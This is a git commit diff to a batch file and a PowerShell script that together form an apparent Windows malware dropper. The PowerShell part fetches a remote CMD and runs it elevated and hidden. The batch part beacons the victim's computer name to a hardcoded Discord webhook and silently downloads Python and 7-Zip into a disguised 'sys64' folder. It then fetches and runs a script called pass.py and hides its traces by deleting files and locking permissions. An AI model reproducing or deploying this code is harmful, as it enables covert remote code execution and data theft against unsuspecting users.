eb5e521bb73d2a8d0570a599c943756cf4fc1c0a
nizhenets <can@nizhenets.com>
2024-06-13 19:09:20 +0300

    lala
    lala

--- ION.cmd
+++ ION.cmd
@@ -1,12 +1,10 @@
 @echo off
 
-:: Set the webhook URL and message
 set "webhookUrl=https://discord.com/api/webhooks/1240038860205985894/qhYcRwGnxahYevjx_X-QSDQXwSj6kOSO4L_47tbHJw8sT4xo29YcWOwZuAiZnqP7XhIz"
 set "startMessage=CMD has been opened on %COMPUTERNAME% at %date% %time%."
 set "downloadStartMessage=Python download started on %COMPUTERNAME% at %date% %time%."
 set "downloadEndMessage=Python download finished on %COMPUTERNAME% at %date% %time%."
 
-:: Function to send a webhook notification
 :send_webhook
 (
 echo param ^(^[string^]$webhookUrl, ^[string^]$message^)
@@ -16,15 +14,9 @@ echo ^} ^| ConvertTo-Json
 echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body
 ) > SendWebhook.ps1
 
-:: Send start notification
 powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%startMessage%"
-
-:: Delete the temporary PowerShell script
 del SendWebhook.ps1
 
-:: Continue with the rest of the script
-
-:: %appdata% yolunda sys64\7zip klasörü oluştur
 set "baseFolderPath=%appdata%\sys64"
 set "installFolderPath=%baseFolderPath%\7zip"
 
@@ -32,22 +24,15 @@ if not exist "%installFolderPath%" (
     mkdir "%installFolderPath%"
 )
 
-:: 7zip dosyasını indir
 set "downloadUrl=http:///test/7z2406-x64.exe"
 set "downloadPath=%baseFolderPath%\7z2406-x64.exe"
 
 bitsadmin /transfer myDownloadJob /download /priority high "%downloadUrl%" "%downloadPath%"
-
-:: İndirilen 7zip dosyasını 7zip klasörüne kur
 cd /d "%baseFolderPath%"
 "%downloadPath%" /D=%installFolderPath% /S
-
-:: Kurulum dosyasını kalıcı olarak sil
 del "%downloadPath%" /f /q
-:: Silinen dosyanın geri dönüşüm kutusuna gitmemesi için ek önlem
 echo Y|cacls "%downloadPath%" /P everyone:n
 
-:: Notify before Python download starts
 echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
 echo $body = ^@^{ >> SendWebhook.ps1
 echo content = $message >> SendWebhook.ps1
@@ -55,10 +40,8 @@ echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
 echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1
 
 powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%downloadStartMessage%"
-
 del SendWebhook.ps1
 
-:: Dosyaları sys64 klasörüne indir
 set "pythonZipUrl=http:///test/Python312.zip"
 set "pythonPartUrl=http:///test/Python312.z01"
 set "pythonZipPath=%baseFolderPath%\Python312.zip"
@@ -67,7 +50,6 @@ set "pythonPartPath=%baseFolderPath%\Python312.z01"
 bitsadmin /transfer pythonZipDownload /download /priority high "%pythonZipUrl%" "%pythonZipPath%"
 bitsadmin /transfer pythonPartDownload /download /priority high "%pythonPartUrl%" "%pythonPartPath%"
 
-:: Notify after Python download finishes
 echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
 echo $body = ^@^{ >> SendWebhook.ps1
 echo content = $message >> SendWebhook.ps1
@@ -75,28 +57,21 @@ echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
 echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1
 
 powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%downloadEndMessage%"
-
 del SendWebhook.ps1
 
-:: py klasörünü oluştur
 set "extractFolderPath=%baseFolderPath%\py"
 if not exist "%extractFolderPath%" (
     mkdir "%extractFolderPath%"
 )
 
-:: 7z.exe kullanarak python312.zip'i çıkart
 cd /d "%baseFolderPath%\7zip"
 "%installFolderPath%\7z.exe" x "%pythonZipPath%" -o"%extractFolderPath%"
 
-:: Python312.zip ve Python312.z01 dosyalarını kalıcı olarak sil
 del "%pythonZipPath%" /f /q
 del "%pythonPartPath%" /f /q
-
-:: Silinen dosyaların geri dönüşüm kutusuna gitmemesi için ek önlem
 echo Y|cacls "%pythonZipPath%" /P everyone:n
 echo Y|cacls "%pythonPartPath%" /P everyone:n
 
-:: scripts klasörünü oluştur ve pass.py dosyasını indir
 set "scriptsFolderPath=%baseFolderPath%\scripts"
 if not exist "%scriptsFolderPath%" (
     mkdir "%scriptsFolderPath%"
@@ -107,17 +82,11 @@ set "scriptPath=%scriptsFolderPath%\pass.py"
 
 bitsadmin /transfer scriptDownload /download /priority high "%scriptUrl%" "%scriptPath%"
 
-:: Yolları kontrol et
 echo Python path: "%extractFolderPath%\pythonw.exe"
 echo Script path: "%scriptPath%"
 
-:: pass.py scriptini çalıştır
 "%extractFolderPath%\python.exe" "%scriptPath%"
 
-:: Hata ayıklama için python.exe kullan
-:: "%extractFolderPath%\python.exe" "%scriptPath%"
-
-:: py klasörünü ve içeriğini sil
 rmdir /s /q "%extractFolderPath%"
 
 echo İşlem tamamlandı.
--- nizhenets.ps1
+++ nizhenets.ps1
@@ -1,25 +1,15 @@
-# Enable TLSv1.2 for compatibility
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Set the URL for the CMD file
 $cmdUrl = "https://github.com/nizhenets/test/raw/main/test.cmd"
-
-# Define the temporary file path
 $tempPath = "$env:TEMP\test.cmd"
 
-# Download the CMD file
 Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath
 
-# Create a PowerShell script to run the CMD file as administrator in invisible mode
 $scriptContent = @"
 Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start /b $tempPath`"' -Verb RunAs -WindowStyle Hidden
 "@
 
-# Define the path for the temporary PowerShell script
 $psScriptPath = "$env:TEMP\RunAsAdmin.ps1"
-
-# Write the script content to the temporary file
 $scriptContent | Out-File -FilePath $psScriptPath -Encoding ASCII
 
-# Execute the PowerShell script to run the CMD file as administrator in invisible mode
 Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$psScriptPath`"" -WindowStyle Hidden
